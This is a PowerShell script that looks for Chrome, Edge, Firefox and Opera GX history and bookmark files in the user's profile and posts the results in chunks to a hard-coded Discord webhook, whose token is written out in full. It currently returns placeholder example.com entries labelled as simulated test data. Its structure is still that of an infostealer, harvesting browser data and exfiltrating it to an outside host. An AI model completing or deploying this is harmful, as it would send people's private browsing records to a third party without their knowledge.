function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Position = 1, Mandatory = $True)]
        [string]$Browser,
        [Parameter(Position = 2, Mandatory = $True)]
        [string]$DataType
    )

    # Define paths based on the browser and data type
    $Path = $null
    switch ($Browser) {
        'chrome' {
            if ($DataType -eq 'history') {
                $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
            } elseif ($DataType -eq 'bookmarks') {
                $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
            }
        }
        'edge' {
            if ($DataType -eq 'history') {
                $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
            } elseif ($DataType -eq 'bookmarks') {
                $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
            }
        }
        'firefox' {
            if ($DataType -eq 'history') {
                $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
            }
        }
        'opera' {
            if ($DataType -eq 'history') {
                $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
            } elseif ($DataType -eq 'bookmarks') {
                $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
            }
        }
    }

    # Validate the path exists
    if (-Not $Path -or -Not (Test-Path $Path)) {
        Write-Error "File not found: $Path"
        return $null
    }

    # Simulated data for testing
    return @(
        [PSCustomObject]@{Browser = $Browser; User = $env:USERNAME; DataType = $DataType; Data = "http://example.com/$DataType/1"}
        [PSCustomObject]@{Browser = $Browser; User = $env:USERNAME; DataType = $DataType; Data = "http://example.com/$DataType/2"}
        [PSCustomObject]@{Browser = $Browser; User = $env:USERNAME; DataType = $DataType; Data = "http://example.com/$DataType/3"}
    )
}

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position = 0, Mandatory = $True)]
        [string]$Content
    )

    $WebhookURL = "https://discord.com/api/webhooks/1308657646064111617/0jk_WQbEbcvjfOdJgz71sHQT1FYkrVaijOysKMkove-YoA0JwomMJH0fgSAbNej5J5CL"

    $Body = @{
        username = "BrowserDataBot"
        content  = $Content
    }

    try {
        Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType 'application/json' -Body ($Body | ConvertTo-Json -Depth 10)
    } catch {
        Write-Error "Failed to upload to Discord: $_"
    }
}

function Send-Table-To-Discord {
    param (
        [parameter(Position = 0, Mandatory = $True)]
        [array]$Data
    )

    # Format the data as a table
    $TableString = $Data | Format-Table -AutoSize | Out-String

    # Split the table into chunks under 2000 characters
    $Chunks = $TableString -split "(.{1,1999})" -ne ''

    foreach ($Chunk in $Chunks) {
        Upload-Discord -Content "```\n$Chunk\n```"
    }
}

# Gather and send data
$BrowserList = @("chrome", "edge", "firefox", "opera")
$DataTypes = @("history", "bookmarks")

foreach ($Browser in $BrowserList) {
    foreach ($DataType in $DataTypes) {
        $Data = Get-BrowserData -Browser $Browser -DataType $DataType
        if ($Data) {
            Send-Table-To-Discord -Data $Data
        }
    }
}
